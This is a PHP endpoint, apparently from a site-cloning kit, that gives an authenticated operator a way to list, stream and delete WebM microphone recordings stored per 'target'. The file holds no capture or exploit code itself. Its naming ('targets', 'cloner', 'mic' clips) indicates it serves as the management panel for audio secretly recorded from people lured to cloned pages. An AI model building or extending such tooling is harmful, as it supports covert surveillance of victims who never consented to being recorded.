<?php
/**
 * api/audio.php — operator-facing microphone-clip index.
 *
 *   GET  api/audio.php                          → list all clips
 *   GET  api/audio.php?slug=<slug>&file=<f>     → stream the WebM bytes
 *   POST api/audio.php  action=delete  slug=… file=…   → unlink one
 *   POST api/audio.php  action=delete_all  slug=…      → unlink every clip
 */

require_once __DIR__ . '/../auth.php';
require_once __DIR__ . '/../lib/cloner.php';
require_once __DIR__ . '/../lib/store.php';

auth_boot();
if (auth_user() === null) {
    http_response_code(401);
    header('Content-Type: application/json');
    echo json_encode(['ok' => false, 'error' => 'Not authenticated.']);
    exit;
}

$targets_root = realpath(__DIR__ . '/..') . '/targets';

function audio_valid_filename(string $f): bool {
    return (bool) preg_match('/^\d{9,11}_[a-f0-9]{1,12}\.webm$/', $f);
}

function reply_json(int $code, array $payload): void {
    http_response_code($code);
    header('Content-Type: application/json');
    echo json_encode($payload);
    exit;
}

/* ------------------------------------------------------------------ *
 *  GET — serve one or list all.
 * ------------------------------------------------------------------ */
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $slug = strtolower(trim((string) ($_GET['slug'] ?? '')));
    $file = (string) ($_GET['file'] ?? '');

    if ($slug !== '' && $file !== '') {
        if (!cloner_valid_slug($slug) || !audio_valid_filename($file)) {
            reply_json(400, ['ok' => false, 'error' => 'Bad slug or filename.']);
        }
        $abs      = $targets_root . '/' . $slug . '/audio/' . $file;
        $real     = realpath($abs);
        $expected = realpath($targets_root . '/' . $slug . '/audio');
        if ($real === false || $expected === false ||
            !str_starts_with($real, $expected . DIRECTORY_SEPARATOR) ||
            !is_file($real)) {
            reply_json(404, ['ok' => false, 'error' => 'Clip not found.']);
        }
        header('Content-Type: audio/webm');
        header('Content-Length: ' . filesize($real));
        header('Cache-Control: private, max-age=300');
        header('Accept-Ranges: bytes');
        header('X-Content-Type-Options: nosniff');
        readfile($real);
        exit;
    }

    // List from DB.
    $rows  = store_media_list(null, 'mic');
    $items = [];
    $total_size = 0;
    foreach ($rows as $r) {
        $total_size += $r['filesize'];
        $items[] = [
            'target' => $r['target_slug'],
            'file'   => $r['filename'],
            'ts'     => $r['captured_at'],
            'size'   => $r['filesize'],
            'url'    => 'api/audio.php?slug=' . rawurlencode($r['target_slug'])
                      . '&file=' . rawurlencode($r['filename']),
        ];
    }

    $sources = [];
    foreach ($items as $it) $sources[$it['target']] = true;

    reply_json(200, [
        'ok'         => true,
        'count'      => count($items),
        'sources'    => count($sources),
        'total_size' => $total_size,
        'items'      => $items,
    ]);
}

/* ------------------------------------------------------------------ *
 *  POST — delete.
 * ------------------------------------------------------------------ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $slug   = strtolower(trim((string) ($_POST['slug'] ?? '')));
    $file   = (string) ($_POST['file'] ?? '');

    if (!cloner_valid_slug($slug)) {
        reply_json(400, ['ok' => false, 'error' => 'Invalid slug.']);
    }
    $a_dir    = $targets_root . '/' . $slug . '/audio';
    $expected = realpath($a_dir);
    if ($expected === false) {
        reply_json(404, ['ok' => false, 'error' => 'No audio for that target.']);
    }

    if ($action === 'delete') {
        if (!audio_valid_filename($file)) {
            reply_json(400, ['ok' => false, 'error' => 'Invalid filename.']);
        }
        $real = realpath($a_dir . '/' . $file);
        if ($real === false || !str_starts_with($real, $expected . DIRECTORY_SEPARATOR)) {
            reply_json(404, ['ok' => false, 'error' => 'Clip not found.']);
        }
        if (!@unlink($real)) {
            reply_json(500, ['ok' => false, 'error' => 'Failed to delete clip.']);
        }
        store_media_delete($slug, 'mic', $file);
        reply_json(200, ['ok' => true]);
    }

    if ($action === 'delete_all') {
        $deleted = 0;
        foreach (scandir($a_dir) ?: [] as $f) {
            if ($f === '.' || $f === '..') continue;
            if (!audio_valid_filename($f)) continue;
            if (@unlink($a_dir . '/' . $f)) $deleted++;
        }
        store_media_delete_all($slug, 'mic');
        reply_json(200, ['ok' => true, 'deleted' => $deleted]);
    }

    reply_json(400, ['ok' => false, 'error' => 'Unknown action.']);
}

reply_json(405, ['ok' => false, 'error' => 'Method not allowed.']);
